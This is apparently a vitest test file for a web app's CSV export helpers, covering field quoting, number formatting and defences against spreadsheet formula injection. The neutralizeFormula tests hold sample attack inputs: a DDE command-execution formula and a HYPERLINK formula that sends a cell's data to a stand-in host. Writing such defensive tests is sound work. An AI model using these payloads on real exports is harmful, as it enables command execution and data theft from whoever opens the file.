import { describe, it, expect } from "vitest";
import { buildCsv, csvNumber, escapeCsvField, neutralizeFormula } from "@/lib/csv/csv";

// Shared RFC 4180 building blocks behind every "Export CSV" button. The
// food-database and sessions-log exports both lean on these, so an escaping
// regression here would corrupt both files at once.

describe("escapeCsvField", () => {
  it("leaves plain values untouched", () => {
    expect(escapeCsvField("Chicken breast")).toBe("Chicken breast");
    expect(escapeCsvField("")).toBe("");
  });

  it("quotes commas, quotes, and newlines", () => {
    expect(escapeCsvField("Rice, long grain")).toBe('"Rice, long grain"');
    expect(escapeCsvField('Jollof "party" rice')).toBe('"Jollof ""party"" rice"');
    expect(escapeCsvField("1 cup\ncooked")).toBe('"1 cup\ncooked"');
    expect(escapeCsvField("line\rbreak")).toBe('"line\rbreak"');
  });
});

// Formula injection (CWE-1236). Exports carry data other people control:
// a client's own first/last name and booking notes land in the trainer's
// sessions log, so the attacker is anyone who books and the victim is the
// provider opening their own file in Excel or Sheets.
describe("neutralizeFormula", () => {
  it.each(["=", "+", "@", "\t", "\r"])(
    "neutralises a cell opening with %j",
    (trigger) => {
      expect(neutralizeFormula(`${trigger}HYPERLINK("http://evil")`)).toBe(
        `'${trigger}HYPERLINK("http://evil")`,
      );
    },
  );

  it("neutralises the classic DDE and exfiltration payloads", () => {
    expect(neutralizeFormula(`=cmd|'/c calc'!A0`)).toBe(`'=cmd|'/c calc'!A0`);
    expect(neutralizeFormula(`=HYPERLINK("http://evil/?d="&A1,"Open")`)).toBe(
      `'=HYPERLINK("http://evil/?d="&A1,"Open")`,
    );
  });

  it("leaves ordinary text alone", () => {
    expect(neutralizeFormula("Chicken breast")).toBe("Chicken breast");
    expect(neutralizeFormula("")).toBe("");
    expect(neutralizeFormula("Ade Bayo")).toBe("Ade Bayo");
  });

  // A blanket escape on "-" would turn every negative figure in an export
  // into text and break sorting and totals in the sheet.
  it("leaves real negative numbers as numbers", () => {
    expect(neutralizeFormula("-5")).toBe("-5");
    expect(neutralizeFormula("-1.25")).toBe("-1.25");
    expect(neutralizeFormula("-1e3")).toBe("-1e3");
    expect(neutralizeFormula("0")).toBe("0");
  });

  it("still neutralises a minus that is not a number", () => {
    expect(neutralizeFormula("-1+1)*cmd")).toBe("'-1+1)*cmd");
  });
});

describe("escapeCsvField + injection", () => {
  it("neutralises before quoting so the apostrophe sits inside the quotes", () => {
    // Quoting alone does not defuse a formula — the spreadsheet strips the
    // quotes on import and evaluates what is left.
    expect(escapeCsvField('=SUM(A1,A2)')).toBe(`"'=SUM(A1,A2)"`);
  });

  it("protects a client display name flowing into the sessions export", () => {
    expect(escapeCsvField("=1+1")).toBe("'=1+1");
  });
});

describe("csvNumber", () => {
  it("keeps an explicit zero distinct from a missing value", () => {
    expect(csvNumber(0)).toBe("0");
    expect(csvNumber(undefined)).toBe("");
    expect(csvNumber(null)).toBe("");
  });

  it("never prints undefined into the file", () => {
    expect(csvNumber(undefined)).not.toContain("undefined");
  });
});

describe("buildCsv", () => {
  it("emits the header row even with no body rows", () => {
    expect(buildCsv(["A", "B"], [])).toBe("A,B");
  });

  it("emits one line per row", () => {
    expect(buildCsv(["A", "B"], [["1", "2"], ["3", "4"]])).toBe("A,B\n1,2\n3,4");
  });

  it("escapes headers as well as cells", () => {
    expect(buildCsv(["Duration, min"], [["45"]])).toBe('"Duration, min"\n45');
  });
});
